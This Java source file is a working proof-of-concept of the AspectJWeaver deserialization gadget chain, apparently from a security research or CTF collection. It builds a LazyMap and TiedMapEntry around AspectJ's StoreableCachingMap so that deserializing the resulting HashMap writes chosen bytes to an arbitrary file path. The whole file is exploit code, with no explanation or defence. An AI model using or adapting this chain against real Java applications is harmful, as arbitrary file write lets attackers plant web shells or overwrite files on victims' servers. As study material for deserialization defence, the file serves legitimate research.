package com.javasec.pocs.aspectjweaver;

import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xml.internal.security.utils.Base64;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class AspectjweaverChain {
    final static String path = "E:\\1.txt";
    public static void main(String[] args) throws Exception {
        byte[] content = Base64.decode("V2VsQ29tZSBUbyBXTUNURjIwMjM=");
        Class aspectJWeaver = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor ctor = aspectJWeaver.getDeclaredConstructor(String.class, int.class);
        ctor.setAccessible(true);
        Object obj = ctor.newInstance("",2);
        Transformer transformer = new ConstantTransformer(content);
        Map lazyMap = LazyMap.decorate((Map)obj, transformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, path);
        HashMap<Object, Object> hashMap = SerializeUtils.makeMap("pop", entry);
        SerializeUtils.deserTester(hashMap);
    }
}
